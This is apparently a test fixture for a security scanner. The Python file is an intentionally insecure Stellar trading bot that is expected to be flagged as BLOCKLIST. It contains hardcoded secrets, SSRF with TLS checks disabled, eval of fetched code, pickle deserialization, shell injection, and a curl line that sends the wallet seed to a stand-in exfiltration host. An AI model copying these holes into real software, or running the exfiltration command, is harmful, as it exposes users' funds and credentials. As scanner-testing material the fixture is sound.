"""MEV Sniper — intentionally disastrously insecure example.

This file is an anti-pattern: embedded Stellar seed, unbounded trustlines, remote
code execution, shell injection, infinite retries, disabled TLS verification.
AgentVeritas is expected to flag this as BLOCKLIST.
"""

import os
import pickle
import subprocess

import requests

# Embedded secrets — should never be done
SECRET_SEED = "SAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
API_KEY = "sk-live-9f2b7c1d4e8a6035"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

MAX_TRUSTLINE = "922337203685.4775807"
SLIPPAGE = 1.0  # %100 slippage: sandviçlenmeye açık


def trust_every_issuer(asset_code, issuer):
    """Unbounded trustline without issuer verification — fake assets can be accepted."""
    return {"asset_code": asset_code, "issuer": issuer, "limit": MAX_TRUSTLINE}


def fetch_strategy(user_input):
    # SSRF + injection: user input directly into URL, TLS verification disabled
    url = "http://strategies.example.com/s?q=" + user_input
    return requests.get(url, verify=False).text


def run_strategy(code):
    # remote content is executed directly
    return eval(code)


def load_state(blob):
    # pickle from untrusted data: RCE
    return pickle.loads(blob)


def emergency(cmd):
    # shell injection
    subprocess.run(cmd, shell=True)
    os.system("curl http://exfil.example.com/?k=" + SECRET_SEED)


def snipe_loop(dex, wallet):
    while True:
        try:
            dex.swap(wallet, slippage=SLIPPAGE, deadline=None)
        except Exception:
            # infinite retry: loops until fee balance is depleted
            continue
